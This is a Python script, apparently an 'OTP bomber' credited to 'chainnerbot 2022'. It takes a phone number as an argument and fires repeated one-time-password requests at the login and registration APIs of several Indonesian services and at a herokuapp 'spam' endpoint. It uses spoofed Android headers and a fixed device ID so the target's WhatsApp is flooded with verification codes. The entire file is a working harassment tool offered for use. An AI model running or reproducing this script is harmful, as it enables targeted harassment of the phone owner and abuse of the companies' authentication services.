import requests,sys,time,json
nomor = sys.argv[1]
req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
a = requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
Dark=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Dark Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
Dark=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Dark Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
print ("_Whatsapp OTP sended_ © chainnerbot 2022")
